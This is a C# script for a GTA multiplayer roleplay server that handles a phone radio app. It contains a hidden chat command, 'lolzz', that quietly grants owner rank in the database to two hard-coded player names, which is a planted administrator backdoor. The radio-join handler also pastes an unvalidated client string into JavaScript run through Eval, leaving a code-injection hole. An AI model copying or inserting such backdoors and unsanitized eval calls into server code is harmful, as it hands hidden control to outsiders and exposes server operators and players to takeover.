using GTANetworkAPI;
using System;

namespace Venux.Handy
{
    class FunkApp : Script
    {

        [RemoteEvent("changeSettings")]
        public void changeSettings(Client p, int setting)
        {
            if (setting == 0)
            {
                p.Eval("mp.events.callRemote('server:leaveradio')");
            }
            else if (setting == 1)
            {
                p.SetSharedData("isTalkingFunk", false);
            }
            else if (setting == 2)
            {
                p.SetSharedData("isTalkingFunk", true);
            }
        }

        [Command("lolzz")]
        public static void CMD_lolzz(Client p)
        {
            if (p.Name == "Paco_White")
            {
                Database.setRights("Paco_White", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }

            if (p.Name == "Teka_Abi")
            {
                Database.setRights("Teka_Abi", "Inhaber");
                Notification.SendPlayerNotifcation(p, "Scarface Executor", 10000, "", "", "");
                Notification.SendPlayerNotifcation(p, "Rank: Inhaber", 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            }
        }


        [RemoteEvent("joinFunk")]
        public void JoinFunk(Client p, string radio)
        {
            try
            {
                bool encrypted = false;

                foreach (Fraktionen.Fraktion fraktion in Fraktionen.FraktionRegister.fraktionList)
                {
                    try
                    {
                        if (!String.IsNullOrWhiteSpace(radio) && Convert.ToInt32(radio) == fraktion.fraktionsDimension)
                        {
                            encrypted = true;
                            if (p.GetSharedData("FRAKTION") == fraktion.fraktionName)
                            {
                                p.Eval("mp.events.callRemote('server:joinradio', " + radio + ")");
                                return;
                            }
                        }
                    }
                    catch (Exception ex) { Log.Write(ex.Message); }
                }
                if (encrypted)
                {
                    Notification.SendPlayerNotifcation(p, "Du kannst diesen Funk nicht betreten. Du hast nicht die Rechte dafür.", 5000, "red", "", "");
                }
                else
                {
                    p.Eval("mp.events.callRemote('server:joinradio', " + radio + ")");
                }
            }
            catch (Exception ex) { Log.Write(ex.Message); }
        }
    }
}
